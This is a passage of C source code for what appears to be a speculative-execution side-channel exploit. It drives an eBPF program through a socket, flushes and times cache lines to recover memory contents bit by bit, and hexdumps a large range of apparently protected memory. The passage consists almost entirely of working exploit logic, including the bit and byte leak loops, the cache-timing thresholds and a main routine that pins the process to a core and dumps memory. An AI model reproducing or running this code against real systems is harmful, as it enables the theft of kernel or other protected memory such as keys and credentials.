        unsigned long user_leak_area_index, char *user_leak_area) {
  array_set_dw(leakprog->data_map, 2, 1UL<<in_dw_bit_offset);
  array_set_dw(leakprog->data_map, 3, in_dw_bit_offset);

  char *user_leak_ptr1 = user_leak_area;
  char *user_leak_ptr2 = user_leak_area + 1024;

  for (int i=0; i<0x2001; i++) {
    if ((i & 0xf) != 0xf) {
      array_set_dw(leakprog->data_map, 0, 3); // access at 8*3
      array_set_dw(leakprog->data_map, 1, 0); // execute instaquit program
    } else {
      array_set_dw(leakprog->data_map, 0, dw_offset); // access at 8*dw_offset
      array_set_dw(leakprog->data_map, 1, user_leak_area_index); // leak to userspace

      bounce_two_cachelines(leakprog->victim_map, leakprog->prog_map);
      user_flush_cacheline(user_leak_ptr1);
      user_flush_cacheline(user_leak_ptr2);
    }

    trigger_proc(leakprog->sockfd);

    if ((i & 0xf) != 0xf) {

    } else {
      int times[2];
      times[0] = user_timed_reload(user_leak_ptr1);
      times[1] = user_timed_reload(user_leak_ptr2);
      bool bit_is_0 = (times[0] < 200);
      bool bit_is_1 = (times[1] < 200);
      if (bit_is_0 != bit_is_1) {
        return bit_is_1;
      } else {
        
      }
    }
  }

  return -1;
}

int leak_byte(struct mem_leaker_prog *leakprog, unsigned long byte_offset,
        unsigned long user_leak_area_index, char *user_leak_area) {
  int byte = 0;
  int bit_pos_for_byte = (byte_offset&0x7)*8;
  for (int pos = 0; pos < 8; pos++) {
    int bit = leak_bit(leakprog, byte_offset/8, bit_pos_for_byte + pos,
            user_leak_area_index, user_leak_area);
    if (bit == -1) {
      return -1;
    }
    if (bit == 1) {
      byte |= (1<<pos);
    }
  }
  return byte;
}

void hexdump_memory(struct mem_leaker_prog *leakprog,
        unsigned long user_leak_area_index, char *user_leak_area,
        unsigned long byte_offset_start, unsigned long byte_count) {
  if (byte_count % 16)
    errx(1, "hexdump_memory called with non-full line");
  for (unsigned long byte_offset = byte_offset_start; byte_offset < byte_offset_start + byte_count;
          byte_offset += 16) {
    int bytes[16];
    for (int i=0; i<16; i++) {
      bytes[i] = leak_byte(leakprog, byte_offset + i, user_leak_area_index, user_leak_area);
    }
    char line[1000];
    char *linep = line;
    linep += sprintf(linep, "%08lx  ", byte_offset);
    for (int i=0; i<16; i++) {
      if (bytes[i] == -1) {
        linep += sprintf(linep, "?? ");
      } else {
        linep += sprintf(linep, "%02hhx ", (unsigned char)bytes[i]);
      }
    }
    linep += sprintf(linep, " |");
    for (int i=0; i<16; i++) {
      if (bytes[i] == -1) {
        *(linep++) = '?';
      } else {
        if (isalnum(bytes[i]) || ispunct(bytes[i]) || bytes[i] == ' ') {
          *(linep++) = bytes[i];
        } else {
          *(linep++) = '.';
        }
      }
    }
    linep += sprintf(linep, "|");
    puts(line);
  }
}

int main(void) {
  setbuf(stdout, NULL);

  // pin to core 0
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &set))
    err(1, "sched_setaffinity");

  struct mem_leaker_prog leakprog = load_mem_leaker_prog();

  char *user_leak_area = (char*)malloc(10000) + 1024;
  unsigned long user_leak_area_offset = (unsigned long)user_leak_area - leakprog.progmap_data;
  if (user_leak_area_offset & 7)
    errx(1, "alignment fail");
  unsigned long user_leak_area_index = user_leak_area_offset / 8;

  cacheline_bounce_worker_enable();

  hexdump_memory(&leakprog, user_leak_area_index, user_leak_area,
          0x1000, 0x100000000);

  return 0;
}
